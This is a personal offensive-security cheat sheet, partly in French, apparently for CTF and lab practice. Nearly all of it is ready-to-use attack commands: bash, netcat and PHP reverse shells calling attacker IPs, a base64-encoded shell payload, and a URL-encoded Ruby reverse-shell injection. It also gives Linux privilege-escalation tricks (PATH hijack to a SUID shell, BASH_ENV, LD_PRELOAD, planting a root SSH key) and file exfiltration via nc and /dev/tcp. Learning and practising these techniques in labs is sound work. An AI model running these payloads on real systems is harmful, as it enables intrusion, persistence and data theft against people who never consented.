#offsecMethodo

# RCE
## _SSH Command Execution_
```
ssh -p 2220 bandit18@bandit.labs.overthewire.org -t "cat /home/bandit18/readme"
```

# reverShells
## _listener on a local port_
```
rlwrap nc -lvnp 1234
```
## _reverse shell from the remote server_
```
bash -i >& /dev/tcp/@IP/1234 0>&1
``` 
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.16.108 1234 >/tmp/f
```
### can encode payload in Base64 
marche pour les formulaire
```
echo -n 'bash -i >& /dev/tcp/10.10.17.161/1234 0>&1' | base64 -w 0
```
```
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNy4xNjEvMTIzNCAwPiYx | base64 -d | bash
```
## _Create end send a reverse shell php file to webvictim_
```
echo '<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.108 1234 >/tmp/f"); ?>' > shell.php
```
```
echo "<?php system("bash -c 'bash -i >& /dev/tcp/10.201.1.201/1234 0>&1'");?>" > shell.php
```
## _form post_
```
curl 'http://remote@ip' -X POST -d 'url=http%3A%2F%2FLOCAL-ADDRESS%3ALOCAL-PORT%2F%3Fname%3D%2520%60+ruby+-rsocket+-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%22LOCAL-ADDRESS%22%2CLOCAL-PORT%29%29%27%60'
```
	| `ctrl+z` then `stty raw -echo` then `fg` then `enter` twice | Upgrade shell TTY (2) |
	| `curl -X POST http://remot@IP/.%0d./.%0d./.%0d./bin/sh -d 'id | nc L@IP port'` | RCE
## _to allow the call backs on port 80 and 443 to our machine_
```
ufw allow from adresseip proto tcp to any port 80,443
```

# Privilege Escalation Linux
```
bash -p
```
	| `sudo -l` | List available `sudo` privileges |
	| `sudo -u user /bin/echo Hello World!` | Run a command with `sudo` |
	| `sudo su -` | Switch to root user (if we have access to `sudo su`) |
	| `sudo su user -` | Switch to a user (if we have access to `sudo su`) |
	| `ssh-keygen -f key` | Create a new SSH key |
	| `echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys` | Add the generated public key to the user |
	| `ssh root@10.10.10.10 -i key` | SSH to the server with the generated private key |

## SUID / SUDO
### Exploit absolute path env #ExploitNotAbsolutPath 
```
% cat change-pass 
#!/bin/ksh user=$1 
passwd $user
```
Rewriting the script in Korn shell helps us avoid the C-shell problem , but we still have problems. The script is vulnerable to a hacker manipulating the PATH variable. Because the program uses relative path names, a hacker can change his PATH to use his own program instead of the regular /usr/bin/passwd program: 
```
% export PATH='/tmp' 
% echo "cp /bin/sh /tmp/sh;chown root /tmp/sh;chmod 4755/tmp/sh" >/tmp/passwd 
% ./change-pass
```
The PATH has been changed, and the change-pass command now runs the /tmp/passwd program instead of the /usr/bin /passwd program that we intended.

```
$ export PATH=/hack/path:$PATH
$ echo $PATH
```

###  script content : system("/bin/bash"); #ExploitBASHENV
```
mkdir /tmp/mych13  
echo "cat .passwd" > /tmp/mych13/startup.sh  
export BASH_ENV=/tmp/mych13/startup.sh  
./script
```
`BASH_ENV` est une variable d'environnement utilisée dans le shell Bash sur les systèmes Linux. Elle spécifie le chemin d'accès vers un fichier qui sera exécuté avant le démarrage de chaque session Bash non interactive.

Une session Bash non interactive est généralement celle qui est utilisée pour exécuter des scripts plutôt que pour une interaction directe avec l'utilisateur dans un terminal. Lorsque vous exécutez un script Bash, la variable `BASH_ENV` peut être utilisée pour spécifier un fichier contenant des configurations spécifiques qui doivent être chargées avant l'exécution du script.

Par exemple, si vous avez un fichier de configuration spécifique pour vos scripts Bash, comme des variables d'environnement particulières ou des paramètres spécifiques au script, vous pouvez le spécifier en utilisant la variable `BASH_ENV`. Cela permet d'assurer que ces configurations sont en place avant l'exécution du script.

```
cat /tmp/toto - |./script
```

### Si le résultat de `sudo -l` contient ``env_keep+=LD_PRELOAD`` ou ``(root) SETENV: NOPASSWD: /opt/monitor.sh``

`SETENV:`: Autorise l'utilisateur à utiliser l'option `-E` ou `--preserve-env` avec sudo, ce qui permet de préserver l'environnement de l'utilisateur lors de l'exécution de la commande.
En utilisant `LD_PRELOAD`, vous pouvez forcer un programme à utiliser des versions spécifiques de fonctions, même si celles-ci ne font pas partie des bibliothèques standard du système.
```bash
gcc -shared exp -o exp -nostartfiles
```
$
```bash
LD_PRELOAD=/tmp/exploit ./program
```
pour le proxy_chain
``` bash
sudo http_proxy=http://10.10.16.108:1234 /opt/monitor.sh
```

# Transferring Files
Start a local webserver 
```
python3 -m http.server 80
```
Download a file on the remote server from our local machine 
```
wget http://10.10.14.1/linpeas.sh
```
## _curl_
```
curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
```
## _base64_
Convert a file to `base64` 
```
base64 shell -w 0
```
Convert a file from `base64` back to its orig
```
echo f0VMR...SNIO...InmDwU \| base64 -d > shell
```
## _aws_
Copie an shell file on remote s3 bucket
```
aws --endpoint=http://s3.domaine_name s3 cp shell.php s3://domaine_name
```
## _ssh_
Transfer a file to the remote server with `scp` (requires SSH access) 
```
scp linenum.sh user@remotehost:/tmp/linenum.sh
```
Transfer a file from the remote server
```
scp remote_username@10.10.0.2:/remote/file.txt /local/directory
```
## **with nc**
	on local
```
nc -lvp port > file
```
 on remote host
```
nc -w 3 l@ip port < file
``` 
```
cat /opt/manage/execute_query > /dev/tcp/10.10.16.108/4321
```

